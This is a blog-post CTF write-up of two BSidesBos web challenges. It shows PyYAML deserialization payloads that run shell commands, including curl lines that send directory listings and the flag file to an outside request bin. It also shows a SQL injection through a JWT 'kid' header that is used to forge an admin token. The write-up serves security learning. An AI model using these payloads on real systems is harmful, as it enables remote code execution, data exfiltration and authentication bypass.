---
layout: post
title: BSidesBos CTF writeup - Web
author: Lorentz Vedeler
date: 2020-09-26
tags:   
    - BSidesBos
category: writeup
---

I only solved two web challenges in this CTF: skid and Yet Another Micro-story Library. All web challenges had a pretty low number of solves.

# Yet Another Micro-story Library

We have to sign up and then log in to see a page with shared stories. When we do we are greeted with a blog listing. At the bottom there is a button to add our own story to the blog.

![Story time front page][story-time]
![Story time yaml form][story-time-form]

We can try to send some malformed yaml to the page:

``` yml
title: "Title of your story"
synopsis: "This is a brief summary of your story"
plot: 
---and they lived happily ever after.
    The End
keywords:
    - "example" 
    - "fiction" 
```

``
Bad Request

Error parsing yaml: while scanning a simple key
in "<unicode string>", line 4, column 1:
---and they lived happily ever a ...
^
could not find expected ':'
in "<unicode string>", line 6, column 1:
keywords:
^
``` 

Googling the errors didn't really give me any clues to which framework was being used, so I decided to just try a few simple payloads.

My first payload was:

```yml
!!python/object/apply:subprocess.Popen
  - ls
``` 
Giving the error below, at least now we can be pretty sure we're dealing with a python application.

```
Internal Server Error

'Popen' object is not subscriptable
```

I actually spent a lot of trying to get Popen to work, but found a different payload after a while.

``` yml
!!python/object/apply:os.system
  - ls
```
It succeeds, but the data does not appear anywhere. We can easily exfiltrate data though with a request bin though.

```yml
!!python/object/apply:os.system
  - ls | curl -X POST --data-binary @-  https://postb.in/1601157034473-5430747917853
```

The flag is in the web directory, so we can just issue a new command:
```yml

!!python/object/apply:os.system
  - cat flag.txt | curl -X POST --data-binary @-  https://postb.in/1601157034473-5430747917853
```


# skid

The challenge is a true script kiddie blog - teaching the fine art of sqlmap and armitage. We notice a cookie has been set:

skidtoken=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiIsImtpZCI6InNraWQifQ.eyJ1c2VybmFtZSI6InNraWQifQ.sacXoUrQCXpaylE4a4RGrCawHqBJJVGfOozOaPxQqOo

The JWT token decodes to the header 
{
  "typ": "JWT",
  "alg": "HS256",
  "kid": "skid"
}

and the body
{
  "username": "skid"
}

The kid field in the header represents a key identifier. The key identifier is used to let the server know which key has been used to sign the token. This is very useful for instance when the token issuing server rotates keys. This allows for a grace period where tokens that have issued right before the key rotation can still be validated by the server after the key rotation. The key identifier is also useful for simply having many different keys at the same time. 

Anyway, this key identifier can often represent a key in a jwks.json file, a regular file or a key in a database. We can look for a publicly available jwks-file. We try a few different files: 
* jwks.json
* /.well-known/jwks.json
* skid.json
* skid

and a few permutations of those, but no luck. Let's instead try to look for a sql injection. We can just modify our token with for instance the tool on jwt.io. Remember that since the kid field is used to look for the key used for the signature, we do not need to provide a valid signature now. Let's just change the kid to `skid'` and see if we can trigger an error. Change the cookie value in developer tools and refresh the page.

```
Bad Request

(sqlite3.OperationalError) unrecognized token: "'skid''"
[SQL: select * from key where name like 'skid'']
(Background on this error at: http://sqlalche.me/e/13/e3q8)
```

Nice, the key is stored in a sqlite db and we have a sql injection vulnerability! We can now use a union to choose our own key by effectivly changing the query to

``` sql
select * from key where name like 'a key that does not exist' 
union 
select <our key>
```

But first we need to detect how many fields there are in the table. A few tries gives us the correct number of columns. The final payload for our kid field is `asdbqweqwe' union select 'a','a','a`. As we have replaced all fields of the key with a's we can forge our token in jwt.io setting the secret to `a` and the username field in the body to admin.

![SQL injection in jwt kid field in jwt.io][forging-token]

[story-time]: /assets/imgs/yaml-blog.png "Story time front page"
[story-time-form]: /assets/imgs/yaml-form.png "Story time form"
[forging-token]: /assets/imgs/jwt-with-sqli.png "SQL injection in jwt kid field in jwt.io"